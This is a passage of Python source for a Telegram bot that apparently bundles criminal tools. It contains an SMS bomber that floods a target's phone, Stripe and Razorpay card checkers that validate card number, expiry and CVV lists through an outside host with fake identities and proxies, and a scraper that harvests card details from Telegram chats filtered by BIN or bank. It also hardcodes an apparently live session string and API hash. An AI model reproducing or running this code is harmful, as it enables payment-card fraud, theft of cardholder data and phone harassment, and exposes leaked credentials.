
        try:
            res = session.post(
                "https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php",
                json=payload,
                timeout=20,
            )
        except Exception as e:
            await bot.send_message(chat_id, f"[{attempts}] ❌ Request error: <code>{e}</code>")
            await asyncio.sleep(0.5)
            continue

        await bot.send_message(chat_id, f"[{attempts}] HTTP {res.status_code} → <code>{res.text.strip()[:80]}</code>")

        try:
            j = res.json()
            if "curr_count" in j:
                sent = int(j["curr_count"])
            elif j.get("status") is True:
                sent += 1
            else:
                sent += 1
        except Exception:
            sent += 1

        await asyncio.sleep(0.3)

    await bot.send_message(chat_id, f"✅ Done! Sent {sent} messages in {attempts} attempts.")


import uuid
import time
import requests
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# ------------------------------
# GLOBAL MAGICSTUDIO KEYS
# ------------------------------
MAGIC_ANON_ID = None
MAGIC_CLIENT_ID = None


# ------------------------------
# KEY GENERATOR (UUID BASED)
# ------------------------------
def generate_new_magic_keys():
    global MAGIC_ANON_ID, MAGIC_CLIENT_ID

    MAGIC_ANON_ID = str(uuid.uuid4())
    MAGIC_CLIENT_ID = str(uuid.uuid4())

    print("\n[MagicStudio] Generated new keys:")
    print("  ANON:", MAGIC_ANON_ID)
    print("  CLIENT:", MAGIC_CLIENT_ID)


# ------------------------------
# MAGICSTUDIO IMAGE REQUEST
# ------------------------------
def magic_generate(prompt: str):
    max_retries = 3

    for attempt in range(max_retries):

        # Generate keys if missing
        if not MAGIC_ANON_ID or not MAGIC_CLIENT_ID:
            generate_new_magic_keys()

        api_url = "https://ai-api.magicstudio.com/api/ai-art-generator"

        payload = {
            "prompt": prompt,
            "output_format": "bytes",
            "user_profile_id": "",
            "anonymous_user_id": MAGIC_ANON_ID,
            "request_timestamp": str(time.time()),
            "user_is_subscribed": "false",
            "client_id": MAGIC_CLIENT_ID,
        }

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://magicstudio.com/ai-art-generator/",
            "Origin": "https://magicstudio.com"
        }

        print(f"\n[MagicStudio] Request #{attempt+1} Prompt: {prompt}")

        try:
            r = requests.post(api_url, data=payload, headers=headers, timeout=30)
        except Exception as e:
            print("Network error:", e)
            if attempt < max_retries-1:
                time.sleep(1)
                continue
            return None, f"Network error: {e}"

        print("[MagicStudio] Status:", r.status_code)

        # Success
        if r.status_code == 200:
            if "image" in r.headers.get("Content-Type", ""):
                print("[MagicStudio] Success, image received.")
                return r.content, None
            return None, "API returned 200 but no image."

        # Keys invalid → regenerate
        if r.status_code == 422:
            print("[MagicStudio] 422 → Bad keys, regenerating...")
            generate_new_magic_keys()
            time.sleep(1)
            continue

        return None, f"API Error {r.status_code}: {r.text[:200]}"

    return None, "Failed after max retries."


# ------------------------------
# TELEGRAM COMMAND: /magic
# ------------------------------
async def magic_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /magic")
        return
    
    query = update.callback_query
    msg = update.message if update.message else query.message

    if query:
        await query.answer()

    user = update.effective_user
    user_id = user.id

    # Load DB
    db = await load_user_db()

    if str(user_id) not in db:
        if query:
            await query.edit_message_text("You need to register first using /register.")
        else:
            await msg.reply_text("You need to register first using /register.")
        return

    # Credit system check
    credits = get_user_credits(user_id)
    cost = 100   # cost per image (change if needed)

    if credits < cost:
        await msg.reply_text(
            f"❌ You need {cost} credit(s). You have {credits}."
        )
        return        
        	
    if len(context.args) == 0:
        return await update.message.reply_text("❌ Usage:\n/magic a beautiful sunset")

    prompt = " ".join(context.args)
    await update.message.reply_text("✨ Generating your image...\nPlease wait 10–20 sec...")

    image_bytes, error = magic_generate(prompt)

    if error:
        await update.message.reply_text(f"❌ Error:\n{error}")
        return

    await update.message.reply_photo(photo=image_bytes, caption=f"🎨 Prompt: {prompt}")
    try:
        for _ in range(100):
            deduct_credit(user_id)
    except:
        pass
        	





async def cmd_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat

    # only groups allowed
    if chat.type == "private":
        await update.message.reply_text("Bomber only allowed in group chat.")
        return ConversationHandler.END

    # running lock check
    if user.id in user_lock and user_lock[user.id].locked():
        await update.message.reply_text("⏳ You already have a session running.")
        return ConversationHandler.END

    # cooldown check
    if not can_user_run(user.id):
        remaining = int(COOLDOWN_SECONDS - (datetime.utcnow() - last_usage[user.id]).total_seconds())
        await update.message.reply_text(f"⏰ Cooldown active. Try again in {remaining}s.")
        return ConversationHandler.END

    await update.message.reply_text("📞 Enter target number (10 digits, without +91):")
    return AWAIT_MOBILE

async def get_mobile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    mobile = update.message.text.strip()

    if not mobile.isdigit() or len(mobile) != 10:
        await update.message.reply_text("❌ Invalid number. Must be 10 digits.")
        return AWAIT_MOBILE

    user_state[user.id] = {"mobile": mobile}
    await update.message.reply_text(f"✅ Number saved: {mobile}\n🎯 How many messages to send?")
    return AWAIT_COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat

    try:
        count = int(update.message.text.strip())
        if count <= 0 or count > 500:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Enter a number between 1 and 500.")
        return AWAIT_COUNT

    mobile = user_state[user.id]["mobile"]
    del user_state[user.id]

    last_usage[user.id] = datetime.utcnow()

    # Create user lock
    if user.id not in user_lock or user_lock[user.id] is None:
        user_lock[user.id] = asyncio.Lock()

    await update.message.reply_text(f"🚀 Starting bombing session\n📞 Mobile: {mobile}\n🎯 Count: {count}\nYou will get updates soon…")

    # Run background task
    context.application.create_task(
        background_worker(user.id, mobile, count, chat.id, context)
    )

    return ConversationHandler.END

async def background_worker(user_id, mobile, count, chat_id, context):
    async with user_lock[user_id]:
        try:
            await run_bomber(mobile, count, context.bot, chat_id)
        finally:
            del user_lock[user_id]


# -------------------- Controller command --------------------
async def cmd_stc(update: Update, context: object):
    user = update.effective_user
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /stc")
        return
    """
    Usage:
      /stc <card1> <card2> ... <cardN> <checkout_url>
    card format: 4242424242424242|12|25|123
    """
    msg = update.message
    text = (msg.text or "").strip()
    parts = text.split()
    if len(parts) < 3:
        await msg.reply_text("<b>Usage:</b>\n/stc (card1) (card2)... (checkout_url)", parse_mode="HTML"); return

    checkout_url = parts[-1]
    cards = [p for p in parts[1:-1] if "|" in p]
    if not cards:
        await msg.reply_text("<b>No valid cards.</b>", parse_mode="HTML"); return
    if len(cards) > 50:
        await msg.reply_text("<b>Max 50 cards allowed.</b>", parse_mode="HTML"); return

    header = ("╔════════════════ STRIPE CHECKER (SAFE) ═══════════════╗\n"
              f"║ CARDS: {len(cards)}  |  MODE: API -> FALLBACK(TEST)  ║\n"
              "╚═════════════════════════════════════════════════════╝")
    try:
        status_msg = await msg.reply_text(f"<pre>{header}\n\nINITIALIZING...</pre>", parse_mode="HTML")
    except:
        status_msg = msg

    loop = asyncio.get_running_loop()

    # Submit API tasks and build mapping future->card
    api_futures = []
    fut_to_card = {}
    for c in cards:
        fut = loop.run_in_executor(MP_STC_POOL, _stc_mp_worker_api, c, checkout_url)
        api_futures.append(fut); fut_to_card[fut] = c

    status_map = {c: {"state":"queued","status_code":None,"message":"","captcha":False,"amount":None,"requires_action":False} for c in cards}

    # render helper
    def render():
        lines = ["╔════════════════ PROCESSOR STATUS ═════════════════╗",
                 f"║ URL: {_short(checkout_url,70)}",
                 "╠══════════════════════════════════════════════════╣",
                 "║ CARD                 | HTTP  | CAPTCHA | AMOUNT   | STATUS",
                 "╠══════════════════════════════════════════════════╣"]
        for c in cards:
            s = status_map[c]
            code = str(s.get("status_code") or "-").rjust(4)
            cap = "YES" if s.get("captcha") else "NO "
            amt = _short(s.get("amount") or "-",12).ljust(12)
            st = s.get("state","")[:12].ljust(12)
            card_sh = _short(c,19).ljust(19)
            lines.append(f"║ {card_sh} | {code} | {cap:^6} | {amt} | {st}")
        lines.append("╚══════════════════════════════════════════════════╝")
        return "<pre>" + "\n".join(lines) + "</pre>"

    try:
        await safe_edit(status_msg, render(), "HTML")
    except:
        pass

    # process API futures as they complete
    done_api = []
    for fut in asyncio.as_completed(api_futures):
        try:
            res = await fut
        except Exception as e:
            card = fut_to_card.get(fut) or next((c for c in cards if status_map[c]["state"]=="queued"), None)
            status_map[card].update({"state":"api_error","message":str(e)})
            try: await safe_edit(status_msg, render(), "HTML")
            except: pass
            continue

        # find card
        card = fut_to_card.get(fut) or (res.get("card") if isinstance(res, dict) else None)
        if not card:
            card = next((c for c in cards if status_map[c]["state"]=="queued"), None)

        # update map
        status_map[card]["status_code"] = res.get("status_code")
        status_map[card]["message"] = res.get("message") or ""
        status_map[card]["captcha"] = res.get("captcha", False)
        status_map[card]["amount"] = res.get("amount")
        status_map[card]["requires_action"] = res.get("requires_action", False)
        status_map[card]["state"] = "success" if res.get("success") else "failed"

        done_api.append(card)
        try: await safe_edit(status_msg, render(), "HTML")
        except: pass

    # fallback list (cards that need fallback)
    fallback_cards = [c for c in cards if status_map[c]["state"] in ("api_error","failed")]
    fallback_futures = []
    if fallback_cards and TEST_ONLY and TEST_STRIPE_SECRET:
        for c in fallback_cards:
            fut = loop.run_in_executor(MP_STC_POOL, _stc_mp_worker_fallback, c, checkout_url)
            fallback_futures.append(fut); fut_to_card[fut] = c
    elif fallback_cards:
        # mark skipped
        for c in fallback_cards:
            status_map[c]["state"] = "skipped_fb"
            status_map[c]["message"] = "No TEST key for fallback"

    # process fallback completions
    if fallback_futures:
        for fut in asyncio.as_completed(fallback_futures):
            try:
                res = await fut
            except Exception as e:
                card = fut_to_card.get(fut)
                status_map[card].update({"state":"fb_error","message":str(e)})
                try: await safe_edit(status_msg, render(), "HTML")
                except: pass
                continue

            card = fut_to_card.get(fut) or (res.get("card") if isinstance(res, dict) else None)
            if not card: continue

            status_map[card]["status_code"] = res.get("status_code")
            status_map[card]["message"] = res.get("message") or status_map[card].get("message")
            status_map[card]["captcha"] = res.get("captcha", False)
            status_map[card]["amount"] = res.get("amount") or status_map[card].get("amount")
            status_map[card]["requires_action"] = res.get("requires_action", False)
            status_map[card]["state"] = "success" if res.get("success") else ("requires_action" if res.get("requires_action") else "failed_fb")

            # attach raw json preview for failed items (as document)
            if not res.get("success") and res.get("raw"):
                try:
                    bio = BytesIO(res["raw"].encode("utf-8"))
                    bio.name = f"raw_{card[:6]}.txt"
                    await msg.reply_document(document=bio, filename=bio.name, caption=f"Raw response for {card[:6]}...")
                except:
                    pass

            try: await safe_edit(status_msg, render(), "HTML")
            except: pass

    # final report
    lines = ["╔════════════════ FINAL REPORT ═══════════════╗",
             "║ MODULE: STRIPE CHECKOUT ANALYZER (SAFE)    ║",
             "╠════════════════════════════════════════════╣"]
    for c in cards:
        s = status_map[c]
        state_word = s.get("state","-")
        code = s.get("status_code") or "-"
        cap = "CAPTCHA" if s.get("captcha") else ""
        amt = s.get("amount") or "-"
        msg_snip = _short(s.get("message") or "-", 60)
        lines.append(f"║ {state_word.ljust(12)} {c.ljust(20)} → {msg_snip.ljust(60)} {str(code).rjust(3)} {cap.ljust(8)} {amt} ║")
    lines.append("╚════════════════════════════════════════════╝")
    final_text = "<pre>" + "\n".join(lines) + "</pre>"

    try:
        await safe_edit(status_msg, final_text, "HTML")
    except:
        await msg.reply_text(final_text, parse_mode="HTML")

    return
# ---------- END STC (enhanced) ----------
                                                                                                                                    
import requests
from bs4 import BeautifulSoup
import re
import asyncio
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=5)  # adjust as needed

def cmd_bk(target_url, max_redirects=5):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    }
    session = requests.Session()  
    current_url = f"https://burhost.byethost13.com/host/burhost_68fc8a5ab7f80.php?url={target_url}"
    redirect_count = 0

    while redirect_count < max_redirects:
        try:
            response = session.get(current_url, headers=headers, timeout=10)
            response.raise_for_status()
            result_text = f"Request {redirect_count + 1} Status Code: {response.status_code}\n"
            result_text += f"Content-Type: {response.headers.get('Content-Type')}\n"
            result_text += f"URL: {current_url}\n"

            if "text/html" not in response.headers.get("Content-Type", ""):
                result_text += "Non-HTML response received, stopping redirect chain.\n"
                result_text += f"Final Content Preview:\n{response.text[:1000]}"
                return result_text

            soup = BeautifulSoup(response.text, 'html.parser')
            script_tags = soup.find_all('script')
            redirect_url = None

            for script in script_tags:
                if script.string and 'location.href=' in script.string:
                    match = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        redirect_url = match.group(1)
                        break

            if not redirect_url:
                result_text += "No further JS redirect found.\n"
                result_text += f"Final Content Preview:\n{response.text[:1000]}"
                return result_text

            result_text += f"Extracted Redirect URL: {redirect_url}\n"
            current_url = redirect_url
            redirect_count += 1

        except Exception as e:
            return f"Error: {e}"

    return f"Max redirects ({max_redirects}) reached. Last content preview:\n{response.text[:1000]}"

async def async_cmd_bk(target_url):
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(executor, cmd_bk, target_url)
    return result
    
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

async def bk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /bk")
        return
    if not context.args:
        await update.message.reply_text("Usage: /bk <url>")
        return
    
    target_url = context.args[0]
    await update.message.reply_text(f"Processing: {target_url}")

    result = await async_cmd_bk(target_url)

    # Telegram message limit ~4096 characters, truncate if too long
    if len(result) > 4000:
        result = result[:4000] + "\n...[truncated]"
    
    await update.message.reply_text(f"```\n{result}\n```", parse_mode="HTML")


#News Bc
# ======================= NEWS FETCHER + UI + COMMAND =======================

import aiohttp
import json
from telegram.ext import CommandHandler

# 1) Fetch clean news text from API
async def fetch_clean_news(prompt: str):
    url = f"https://infoqueries.itz-ashlynn.workers.dev/?prompt={prompt}"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            raw = await resp.text()

    # Try parsing JSON
    try:
        data = json.loads(raw)
    except:
        return "❌ API returned invalid JSON format."

    text = None

    # Main model format (Sonar / OpenAI style)
    if "choices" in data:
        try:
            text = data["choices"][0]["message"]["content"]
        except:
            pass

    # Fallback keys
    if not text:
        for key in ["output", "text", "answer", "content"]:
            if key in data:
                text = data[key]
                break

    if not text:
        return "❌ Unable to extract readable news content."

    # Clean formatting
    text = text.strip()
    while "\n\n\n" in text:
        text = text.replace("\n\n\n", "\n\n")

    return text[:3500]  # Prevent Telegram message-too-long


# 2) Build 3D News Terminal UI
def build_news_ui(clean_text: str):
    top = (
        "<pre>\n"
        "╔══════════════════════════════════════════════╗\n"
        "║            📡 REAL-TIME NEWS REPORT          ║\n"
        "╠══════════════════════════════════════════════╣\n"
    )

    bottom = (
        "╚══════════════════════════════════════════════╝\n"
        "</pre>"
    )

    # Escape HTML characters
    body = clean_text.replace("<", "&lt;").replace(">", "&gt;")

    return top + body + "\n" + bottom


# 3) /news command
async def news_cmd(update, context):
    user = update.effective_user
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /news")
        return
    user_query = " ".join(context.args) if context.args else "today delhi mahipalpur news"

    temp = await update.message.reply_text("📡 Fetching latest news…")

    clean_text = await fetch_clean_news(user_query)

    ui = build_news_ui(clean_text)

    # If too long → break into chunks
    if len(ui) > 3500:
        parts = [ui[i:i+3500] for i in range(0, len(ui), 3500)]
        await temp.delete()

        for p in parts:
            await update.message.reply_html(p)
    else:
        await temp.edit_text(ui, parse_mode="HTML")




def generate_rzp_device_id():
    random_bytes = os.urandom(16)
    fhash = hashlib.sha1(random_bytes).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = f"{random.randint(0, 99999999):08d}"
    return f"1.{fhash}.{ts}.{rnd}", fhash

def generate_rzp_session_id():
    base62 = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.choice(base62) for _ in range(14))

def gen_indian_phone():
    first = random.choice(['6', '7', '8', '9'])
    rest = ''.join(str(random.randint(0, 9)) for _ in range(9))
    return f"+91{first}{rest}"

def gen_email():
    names = ['alex', 'john', 'mike', 'sara', 'david', 'emma', 'james', 'lisa', 'chris', 'anna']
    return f"{random.choice(names)}{random.randint(100, 9999)}@gmail.com"

def get_brand(cc):
    if cc.startswith('4'):
        return "visa"
    if len(cc) >= 2:
        if cc[:2] in ['51', '52', '53', '54', '55']:
            return "mastercard"
        if cc[:2] in ['34', '37']:
            return "amex"
    if cc.startswith('6011') or cc.startswith('65'):
        return "discover"
    return "unknown"


def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except:
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))


PROXY_FILE = "proxies.json"

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    if not user_proxies:
        return None
    return random.choice(user_proxies)

def parse_proxy_format(proxy):
    import re
    proxy = proxy.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        if match:
            potential_host, potential_port, potential_user, potential_pass = match.groups()
            if 0 < int(potential_port) <= 65535:
                host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    
    if not host or not port:
        return None
    
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None
    
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    
    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)
    


async def check_razorpay_card(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Price": "-", "Gateway": "Razorpay"}
        
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        
        year = int(f"20{yy}")
        phone = gen_indian_phone()
        phone_short = phone[3:]
        email = gen_email()
        
        rzp_device_id, fhash = generate_rzp_device_id()
        rzp_session_id = generate_rzp_session_id()
        
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        api_url = f'https://teamoicxkiller.online/code/razorpay.php?cc={card}&url={site}&type=razorpay'
        if proxy_str:
            api_url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "Razorpay"}
                
                try:
                    response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON: {response_text[:100]}", "Price": "-", "Gateway": "Razorpay"}
                
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-':
                    price = f"${price}"
                
                if "charged" in api_response.lower() or "order completed" in api_response.lower():
                    return {"Response": api_response, "Price": price, "Gateway": "Razorpay", "Status": "Charged"}
                elif "approved" in api_response.lower() or "insufficient" in api_response.lower():
                    return {"Response": api_response, "Price": price, "Gateway": "Razorpay", "Status": "Approved"}
                else:
                    return {"Response": api_response, "Price": price, "Gateway": "Razorpay", "Status": api_response}
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "Razorpay"}



# ======================= END NEWS MODULE =======================
        
  

#Scrapper //©


import re
import os
import asyncio
import logging
import aiofiles
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, filters
)
from pyrogram import Client
from pyrogram.errors import (
    UserAlreadyParticipant, InviteHashExpired, InviteHashInvalid,
    PeerIdInvalid, InviteRequestSent
)

# ---------------- CONFIG ----------------
API_ID = 26867853
API_HASH = "b0c1361eb5eaa5cc619644fa4a17e226"
SESSION_STRING = "BQGZ-I0AhEMfEOKsMTlgb_Vv8c8DLTGtAqjnn8uHiphmtiZ3LVqIZ2uTamgIJ3z2TB9xByPBkuwd0UyvRao1U7nSb3YnsbpgojAo9GXVhO398bVm6bRt3nFoHljmju7Pi-AulZhxCJuhenhotXRJohasuI0RRciXb0UoKGhqUbNFvOFP5G5yVUctrgWKG5hRGrVDrEiJwwNBcl7rqfMF-oV76aWsJ1Y5Ni6T5-obNo4ZI53HGY0p5nVf4AhEcagNSyR4_fp9ip0__ziP3AbHnMQGIT3pfr0CDx-JS-xvSM67NcGHFki_BIxbqTbKdZqjIuEypXY_V4lTnmG4AVpxj7Na3GzDlQAAAAFtPHjwAA"
BOT_TOKEN = TOKEN   # INSERT TOKEN

DEFAULT_LIMIT = 5000

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Suppress verbose Pyrogram logging
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logging.getLogger("pyrogram.session.session").setLevel(logging.ERROR)
logging.getLogger("pyrogram.connection.connection").setLevel(logging.ERROR)

# Sync system time before creating Pyrogram client
import subprocess
try:
    result = subprocess.run(
        ["ntpdate", "-s", "pool.ntp.org"],
        capture_output=True,
        timeout=5
    )
except Exception:
    try:
        # Fallback: use timedatectl if available
        subprocess.run(
            ["timedatectl", "set-ntp", "true"],
            capture_output=True,
            timeout=5
        )
    except Exception:
        pass  # Time sync failed, but bot can still work

# Pyrogram Client
user = Client(
    "user_session",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION_STRING,
    workers=1000
)


# -------------------- SCRAPER LOGIC --------------------


async def scrape_messages(client, chat_id, limit, start_number=None, bank_name=None):
    messages = []
    count = 0
    pattern = r'\d{16}\D*\d{2}\D*\d{2,4}\D*\d{3,4}'
    from pyrogram import types
    
    types.Sticker._get_sticker_set_name = staticmethod(lambda *args, **kwargs: None)

    async for message in client.get_chat_history(chat_id, limit=limit*10):
        if count >= limit:
            break

        text = message.text or message.caption
        if not text:
            continue

        if bank_name and bank_name.lower() not in text.lower():
            continue

        found = re.findall(pattern, text)
        if not found:
            continue

        for matched in found:
            nums = re.findall(r'\d+', matched)
            if len(nums) == 4:
                card, mo, yr, cvv = nums
                yr = yr[-2:]

                if start_number and not card.startswith(start_number[:6]):
                    continue

                messages.append(f"{card}|{mo}|{yr}|{cvv}")
                count += 1

    return messages[:limit]


def remove_duplicates(msgs):
    unique = list(set(msgs))
    return unique, len(msgs) - len(unique)


async def get_user_link(update: Update):
    u = update.effective_user
    return f"<a href='tg://user?id={u.id}'>{u.first_name}</a>"


async def send_results(context, update, unique, removed, src, binf=None, bankf=None, temp_msg=None):
    if unique:
        filename = f"x{len(unique)}_{src.replace(' ', '')}.txt"

        async with aiofiles.open(filename, "w") as f:
            await f.write("\n".join(unique))

        async with aiofiles.open(filename, "rb") as f:
            caption = (
                f"<b>Scrape Done ✅</b>\n"
                f"<b>Source:</b> {src}\n"
                f"<b>Total:</b> {len(unique)}\n"
                f"<b>Duplicates:</b> {removed}\n"
            )

            if binf:
                caption += f"<b>BIN:</b> {binf}\n"
            if bankf:
                caption += f"<b>Bank:</b> {bankf}\n"

            caption += f"\nBy: {await get_user_link(update)}"

            if temp_msg:
                await context.bot.delete_message(update.effective_chat.id, temp_msg)

            await context.bot.send_document(
                update.effective_chat.id,
                document=filename,
                caption=caption,
                parse_mode="HTML"
            )

        os.remove(filename)

    else:
        await context.bot.edit_message_text(
            update.effective_chat.id,
            temp_msg,
            "<b>No cards found ❌</b>",
            parse_mode="HTML"
        )


async def join_private_chat(client, link):
    try:
        await client.join_chat(link)
        return True
    except UserAlreadyParticipant:
        return True
    except InviteRequestSent:
        return False
    except:
        return False


# ---------------------- COMMANDS ----------------------

async def scr_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /scr")
        return
    args = context.args
    
    # Usage check
    if len(args) < 2:
        return await update.message.reply_html(
            "<b>Usage:</b>\n"
            "/scr username limit\n"
            "/scr username limit 123456\n"
            "/scr username limit 123456 BANKNAME"
        )

    raw = args[0]
    limit = int(args[1])

    # Mechanical scanning UI (initial)
    ui_loading = (
        "<code>╔════════════════ SCRAPER MODULE ════════════════╗\n"
        "║ STATUS: INITIALIZING…                           ║\n"
        "║ ENGINE: CYBER-MECHANICAL SCANNER v3.1           ║\n"
        "╚══════════════════════════════════════════════════╝</code>"
    )
    temp = await update.message.reply_html(ui_loading)

    # Clean usernames
    if raw.startswith("https://t.me/"):
        raw = raw.split("/")[-1]

    # Join private chats if needed
    if raw.startswith("+") or "joinchat" in raw:
        link = "https://t.me/" + raw
        ok = await join_private_chat(user, link)
        if not ok:
            return await update.message.reply_html("<b>Cannot join chat ❌</b>")
        chat = await user.get_chat(link)
    else:
        chat = await user.get_chat(raw)

    # Determine filters
    start_num = None
    bank = None
    binf = None

    if len(args) >= 3:
        if args[2].isdigit():
            start_num = args[2]
            binf = args[2][:6]
        else:
            bank = " ".join(args[2:])

    # Mechanical scanning UI (active)
    scanning_ui = (
        "<code>╔══════════════ SCANNING SEQUENCE STARTED ══════════════╗\n"
        "║ MODULE: TELEGRAM HISTORY SCRAPER                      ║\n"
        "║ TARGET: @{0}                                          \n"
        "║ SCOPE: {1} ENTRIES                                    \n"
        "║ FILTER: {2}                                           \n"
        "╠════════════════════════════════════════════════════════╣\n"
        "║ PROCESS: ACTIVATING OPTIC SENSORS…                    ║\n"
        "║ PROCESS: LOCKING DATA STREAM…                         ║\n"
        "║ PROCESS: EXTRACTING CREDENTIAL PATTERNS…              ║\n"
        "╚════════════════════════════════════════════════════════╝</code>"
    ).format(
        raw,
        limit,
        binf if binf else bank if bank else "NONE"
    )

    await temp.edit_text(scanning_ui, parse_mode="HTML")

    # Run scraping
    results = await scrape_messages(user, chat.id, limit, start_num, bank)
    unique, removed = remove_duplicates(results)

    # Final Mechanical Report
    final_ui = (
        "<code>╔════════════════ FINAL SCRAPE REPORT ═════════════════╗\n"
        f"║ SOURCE CHAT : {chat.title[:30]}                      \n"
        f"║ TOTAL FOUND : {len(unique)}                          \n"
        f"║ DUPLICATES  : {removed}                              \n"
        f"║ BIN FILTER  : {binf if binf else 'NONE'}             \n"
        f"║ BANK FILTER : {bank if bank else 'NONE'}             \n"
        "╠═══════════════════════════════════════════════════════╣\n"
        "║ STATUS: EXPORTING FILE…                               ║\n"
        "╚═══════════════════════════════════════════════════════╝</code>"
    )

    await temp.edit_text(final_ui, parse_mode="HTML")

    # Send final file through existing function
    await send_results(
        context,
        update,
        unique,
        removed,
        chat.title,
        binf,
        bank,
        temp.message_id
    )




# --------------------- /cko (Stripe Checkout Inspector) ---------------------
# ------------------ FULL /cko STRIPE INTELLIGENCE ENGINE ------------------
import re
import aiohttp
import asyncio
import html
import json
import urllib.parse
